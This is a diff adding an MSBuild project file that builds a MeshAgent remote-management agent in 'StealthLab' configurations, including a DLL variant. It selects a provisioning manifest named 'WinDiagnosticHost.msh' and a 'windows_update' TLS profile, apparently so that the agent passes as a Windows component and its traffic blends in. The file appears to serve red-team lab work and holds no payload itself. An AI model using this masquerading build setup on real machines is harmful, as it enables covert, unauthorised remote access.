@@ -1,0 +1,34 @@
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <RepoRoot>$(MSBuildThisFileDirectory)</RepoRoot>
+    <SolutionFile>$(RepoRoot)MeshAgent-2022.sln</SolutionFile>
+    <ServiceProject>$(RepoRoot)meshservice\MeshService-2022.vcxproj</ServiceProject>
+    <MeshAgentPython Condition="'$(MeshAgentPython)'==''">python</MeshAgentPython>
+    <MeshAgentBrandingConfig Condition="'$(MeshAgentBrandingConfig)'=='' and Exists('$(RepoRoot)branding_config.local.json')">$(RepoRoot)branding_config.local.json</MeshAgentBrandingConfig>
+    <MeshAgentBrandingConfig Condition="'$(MeshAgentBrandingConfig)'==''">$(RepoRoot)branding_config.json</MeshAgentBrandingConfig>
+    <MeshAgentProvisioningManifest Condition="'$(MeshAgentProvisioningManifest)'=='' and Exists('$(RepoRoot)WinDiagnosticHost.msh')">$(RepoRoot)WinDiagnosticHost.msh</MeshAgentProvisioningManifest>
+    <MeshAgentProvisioningManifest Condition="'$(MeshAgentProvisioningManifest)'==''">$(RepoRoot)MeshAgent.msh</MeshAgentProvisioningManifest>
+    <MeshAgentTlsProfile Condition="'$(MeshAgentTlsProfile)'==''">windows_update</MeshAgentTlsProfile>
+    <CommonBuildProperties>MeshAgentPython=$(MeshAgentPython);MeshAgentBrandingConfig=$(MeshAgentBrandingConfig);MeshAgentProvisioningManifest=$(MeshAgentProvisioningManifest);MeshAgentTlsProfile=$(MeshAgentTlsProfile)</CommonBuildProperties>
+  </PropertyGroup>
+
+  <Target Name="BuildStealthLabDll">
+    <MSBuild Projects="$(ServiceProject)" Targets="Build" Properties="$(CommonBuildProperties);Configuration=StealthLab_DLL;Platform=x64" />
+  </Target>
+
+  <Target Name="BuildWholeSolutionX64" DependsOnTargets="BuildStealthLabDll">
+    <MSBuild Projects="$(SolutionFile)" Targets="Build" Properties="$(CommonBuildProperties);Configuration=StealthLab;Platform=x64" />
+  </Target>
+
+  <Target Name="BuildStealthLabWin32" DependsOnTargets="BuildWholeSolutionX64">
+    <MSBuild Projects="$(ServiceProject)" Targets="Build" Properties="$(CommonBuildProperties);Configuration=StealthLab;Platform=Win32" />
+  </Target>
+
+  <Target Name="Build" DependsOnTargets="BuildStealthLabWin32" />
+
+  <Target Name="Clean">
+    <MSBuild Projects="$(SolutionFile)" Targets="Clean" Properties="$(CommonBuildProperties);Configuration=StealthLab;Platform=x64" />
+    <MSBuild Projects="$(ServiceProject)" Targets="Clean" Properties="$(CommonBuildProperties);Configuration=StealthLab_DLL;Platform=x64" />
+    <MSBuild Projects="$(ServiceProject)" Targets="Clean" Properties="$(CommonBuildProperties);Configuration=StealthLab;Platform=Win32" />
+  </Target>
+</Project>
